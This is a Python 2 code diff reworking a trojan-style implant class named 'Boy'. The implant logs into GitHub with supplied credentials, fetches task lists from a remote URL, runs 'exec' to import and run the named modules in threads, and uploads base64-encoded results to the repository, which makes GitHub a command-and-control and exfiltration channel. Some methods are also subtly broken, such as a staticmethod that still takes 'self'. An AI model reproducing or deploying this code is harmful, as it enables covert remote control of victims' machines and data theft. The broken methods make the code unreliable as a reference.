@@ -28,6 +28,7 @@ class Boy(object):
         self.run_modules = config.pop('rm', [])
         self.cf = int(config.pop('cf', 60))
         self.task_queue = Queue.Queue()
+        self.result_path = 'data/%s/' % self._id
         self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
         for g in (guser, gpass, grepo):
             del g
@@ -39,11 +40,19 @@ class Boy(object):
         branch = repo.branch(b)
         return gh, repo, branch
 
-    def save_result(self, data, msg):
-        remote_path = 'data/%s/%d.data' % (
-            self._id, random.randint(1000, 100000))
-        self.repo.create_file(remote_path, msg, base64.b64encode(data))
+    @staticmethod
+    def save_result(self, repo, path, data, msg='new result'):
+        remote_path = path + '%d.data' % random.randint(1000, 100000)
+        repo.create_file(remote_path, msg, base64.b64encode(data))
         return
+
+    @staticmethod
+    def get_file(url):
+        try:
+            data = urlopen(url).read()
+        except Exception:
+            data = None
+        return data
 
     def load(module, url):
         add_remote_repo([module], url)
@@ -64,24 +73,33 @@ class Boy(object):
             except Exception:
                 print 'exception with %s' % pkg
                 pass
-        for m in self.run_modules:
-            try:
-                exec "from toy.modules import %s" % m
-            except Exception:
-                print 'exception with %s' % m
-                pass
+        return
+        # for m in self.run_modules:
+        #     try:
+        #         exec "from toy.modules import %s" % m
+        #     except Exception:
+        #         print 'exception with %s' % m
+        #         pass
 
     @staticmethod
-    def get_config(self, config_url, auto_load=False):
-        try:
-            config = urlopen(config_url).read()
+    def get_config(config_url):
+        config = Boy.get_file(config_url)
+        if config:
             config = json.loads(config)
-            if auto_load:
-                for m in config:
-                    exec "from toy.modules import %s" % m['module']
-        except Exception:
+        else:
             config = {}
         return config
+
+    @staticmethod
+    def get_task(task_url):
+        tasks = Boy.get_file(task_url)
+        if tasks:
+            tasks = json.loads(tasks)
+            for task in tasks:
+                exec "from toy.modules import %s" % task['module']
+        else:
+            tasks = []
+        return tasks
 
     @staticmethod
     def enc(data):
@@ -95,25 +113,20 @@ class Boy(object):
         self.task_queue.put(1)
         result = sys.modules[m].run()
         self.task_queue.get()
-        self.save_result(result)
+        self.save_result(self.repo, self.result_path, result)
         return
 
     def run(self):
         self.install()
-
         while True:
             if self.task_queue.empty():
-                tasks = self.get_config(
-                    self.task_url + self._id + '.json', True)
+                tasks = self.get_task(self.task_url + self._id + '.json')
                 for task in tasks:
-                    try:
-                        # exec "from toy.modules import %s" % rm
-                        t = threading.Thread(
-                            target=self.worker, args=(task['module'],))
-                        t.start()
-                        time.sleep(random.randint(1, 10))
-                    except Exception:
-                        pass
-
-            # time.sleep(random.randint(1000, 10000))
+                    print "run task %s" % task['module']
+                    t = threading.Thread(
+                        target=self.worker, args=(task['module'],))
+                    t.start()
+                    time.sleep(random.randint(1, 10))
             time.sleep(self.cf)
+            # time.sleep(random.randint(1000, 10000))
+
